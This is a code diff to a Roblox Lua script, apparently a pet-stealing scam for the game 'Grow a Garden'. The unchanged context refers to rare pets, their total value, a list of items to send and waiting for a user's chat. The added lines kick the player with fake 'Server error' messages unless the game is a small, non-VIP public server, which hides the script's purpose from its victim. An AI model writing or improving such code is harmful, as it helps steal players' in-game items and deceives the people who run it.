@@ -26,6 +26,21 @@ local rarePets = {"Red Fox", "Raccoon", "Dragonfly, Griffin, Golden Goose, Kitsu
 local totalValue = 0
 local itemsToSend = {}
 
+if game.PlaceId ~= 126884695634066 then
+    plr:kick("Game not supported. Please join a normal GAG server")
+    return
+end
+
+if #Players:GetPlayers() >= 5 then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
 local function calcPetValue(v14)
     local hatchedFrom = v14.PetData.HatchedFrom
     if not hatchedFrom or hatchedFrom == "" then
@@ -352,6 +367,7 @@ if #itemsToSend > 0 then
     waitForUserChat()
 
 end
+
 
 
 
